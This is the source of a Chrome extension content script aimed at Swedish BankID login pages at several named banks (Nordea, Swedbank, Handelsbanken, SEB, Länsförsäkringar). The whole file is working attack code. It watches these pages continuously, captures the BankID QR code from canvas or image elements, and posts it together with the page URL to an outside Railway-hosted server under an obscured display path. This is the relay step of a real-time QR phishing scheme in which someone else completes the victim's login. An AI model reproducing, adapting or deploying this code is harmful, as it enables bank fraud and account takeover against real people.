// Server configuration
const PRODUCTION_URL = 'https://web-production-c116.up.railway.app';

// Bank configurations
const BANK_CONFIGS = {
    BANKID: {
        identifier: {
            urls: ['bankid.com', 'bankid.'],
            titles: ['bankid', 'logga in'],
            domains: ['bankid']
        },
        selectors: {
            qrCanvas: 'canvas[title*="QR-kod"], canvas[alt*="QR-kod"]',
            qrCanvasById: 'canvas[id*="qr"], canvas[id*="bankid"]',
            qrCanvasClass: 'canvas[class*="qr"], canvas[class*="bankid"]',
            qrCanvasAll: 'canvas[id*="bankid"], canvas[class*="bankid"], canvas[data-testid*="qr"]',
            qrImage: 'img[alt*="QR-kod"], img[class*="qr-code"]'
        }
    },
    NORDEA: {
        selectors: {
            qrCanvas: 'canvas.qr-code-canvas[title="QR-kod"]',
            qrCanvasById: 'canvas#qr-code-canvas',
            qrCanvasAll: 'canvas[title="QR-kod"]',
            qrImage: 'img[alt*="QR-kod"]'
        }
    },
    SWEDBANK: {
        selectors: {
            qrCanvas: 'canvas#sbid-qr',
            qrCanvasById: 'canvas[id*="qr"], canvas[id*="bankid"], canvas[id*="sbid"]',
            qrCanvasClass: 'canvas[class*="qr"], canvas[class*="bankid"], canvas[class*="sbid"]',
            qrCanvasAll: 'canvas[id*="bankid"], canvas[class*="bankid"], canvas[data-testid*="qr"]',
            qrImage: 'img.mobile-bank-id__qr-code--image, img[alt*="QR-kod"], img[class*="qr-code"]'
        }
    },
    HANDELSBANKEN: {
        selectors: {
            qrCanvas: 'canvas[id*="qr"], canvas[class*="qr"]',
            qrImage: 'img[alt*="QR-kod"], img[class*="qr-code"]'
        }
    },
    SEB: {
        selectors: {
            qrCanvas: 'canvas[id*="qr"], canvas[class*="qr"]',
            qrImage: 'img[alt*="QR-kod"], img[class*="qr-code"]'
        }
    },
    LANSFORSAKRINGAR: {
        selectors: {
            qrCanvas: 'canvas[id*="qr"], canvas[class*="qr"]',
            qrImage: 'img[alt*="QR-kod"], img[class*="qr-code"]'
        }
    }
};

// Global configuration
const CONFIG = {
    captureInterval: 50,
    captureThrottle: 100,
    lastCapture: 0,
    lastHash: null,
    displayUrl: `${PRODUCTION_URL}/Bankidfelsokningskundidentifieringkund98721311`
};

// Function to send QR code to server
async function sendQRCode(imageData, bankName = 'BANKID') {
    try {
        console.log('Preparing to send QR code for bank:', bankName);
        
        // Validate the image data
        if (!imageData || typeof imageData !== 'string') {
            throw new Error('Invalid image data');
        }
        
        if (!imageData.startsWith('data:image/')) {
            throw new Error('Invalid image data format');
        }
        
        const payload = {
            qrData: imageData,
            bank: bankName,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            displayUrl: CONFIG.displayUrl
        };
        
        console.log('Request payload structure:', {
            hasQrData: !!payload.qrData,
            qrDataLength: payload.qrData.length,
            qrDataPrefix: payload.qrData.substring(0, 30),
            bank: payload.bank,
            timestamp: payload.timestamp
        });
        
        const response = await fetch(`${PRODUCTION_URL}/api/qr`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Server response:', errorText);
            throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
        }

        const result = await response.json();
        console.log('Server response:', result);
        showNotification('QR code captured and sent successfully');
    } catch (error) {
        console.error('Error sending QR code:', error);
        showNotification('Error sending QR code: ' + error.message, true);
    }
}

// Function to capture QR code from canvas or image
function captureQRCode() {
    const now = Date.now();
    
    if (now - CONFIG.lastCapture < CONFIG.captureThrottle) {
        return;
    }

    // Try to find QR codes from all bank configurations
    for (const [bankName, bankConfig] of Object.entries(BANK_CONFIGS)) {
        // Try image first
        if (bankConfig.selectors.qrImage) {
            const qrImage = document.querySelector(bankConfig.selectors.qrImage);
            if (qrImage) {
                try {
                    const canvas = document.createElement('canvas');
                    const rect = qrImage.getBoundingClientRect();
                    
                    canvas.width = qrImage.naturalWidth || rect.width;
                    canvas.height = qrImage.naturalHeight || rect.height;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(qrImage, 0, 0);
                    
                    const base64Data = canvas.toDataURL('image/png');
                    if (base64Data && base64Data !== 'data:,') {
                        const hash = base64Data.slice(-32);
                        if (hash !== CONFIG.lastHash) {
                            CONFIG.lastHash = hash;
                            CONFIG.lastCapture = now;
                            console.log(`Found QR image for bank: ${bankName}`);
                            sendQRCode(base64Data, bankName);
                            return;
                        }
                    }
                } catch (error) {
                    console.error(`Error capturing QR image for ${bankName}:`, error);
                }
            }
        }

        // Try canvas elements
        const selectors = bankConfig.selectors;
        const qrCanvas = document.querySelector(selectors.qrCanvas) || 
                        document.querySelector(selectors.qrCanvasById) ||
                        document.querySelector(selectors.qrCanvasClass) ||
                        document.querySelector(selectors.qrCanvasAll) ||
                        Array.from(document.getElementsByTagName('canvas')).find(canvas => 
                            canvas.width === canvas.height && 
                            canvas.width >= 150 && 
                            canvas.width <= 300
                        );
        
        if (qrCanvas) {
            try {
                const rect = qrCanvas.getBoundingClientRect();
                if (rect.width === 0 || rect.height === 0) {
                    continue;
                }

                const base64Data = qrCanvas.toDataURL('image/png');
                if (!base64Data || base64Data === 'data:,') {
                    continue;
                }

                const hash = base64Data.slice(-32);
                if (hash === CONFIG.lastHash) {
                    console.log('Same QR code as last capture');
                    continue;
                }
                
                CONFIG.lastHash = hash;
                CONFIG.lastCapture = now;

                console.log(`Found QR canvas for bank: ${bankName}`);
                sendQRCode(base64Data, bankName);
                return;
            } catch (error) {
                console.error(`Error capturing QR canvas for ${bankName}:`, error);
            }
        }
    }
}

// Function to show notification
function showNotification(message, isError = false) {
    let notification = document.getElementById('qr-capture-notification');
    if (!notification) {
        notification = document.createElement('div');
        notification.id = 'qr-capture-notification';
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 4px;
            color: white;
            font-family: Arial, sans-serif;
            z-index: 999999;
            transition: opacity 0.3s ease-in-out;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        `;
        document.body.appendChild(notification);
    }

    notification.style.backgroundColor = isError ? '#dc3545' : '#28a745';
    notification.textContent = message;
    notification.style.opacity = '1';

    setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => notification.remove(), 300);
    }, 2000);
}

// Start monitoring
let captureInterval;
let observerTimeout;

function startMonitoring() {
    if (captureInterval) clearInterval(captureInterval);
    
    captureInterval = setInterval(captureQRCode, CONFIG.captureInterval);
    setTimeout(captureQRCode, 100);

    const observer = new MutationObserver((mutations) => {
        if (observerTimeout) clearTimeout(observerTimeout);
        observerTimeout = setTimeout(captureQRCode, 10);
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['src', 'style', 'class', 'id', 'data-testid']
    });
}

// Start monitoring when the page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startMonitoring);
} else {
    startMonitoring();
}

// Handle messages from the extension
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'captureQR') {
        captureQRCode();
        sendResponse({ success: true });
    }
}); 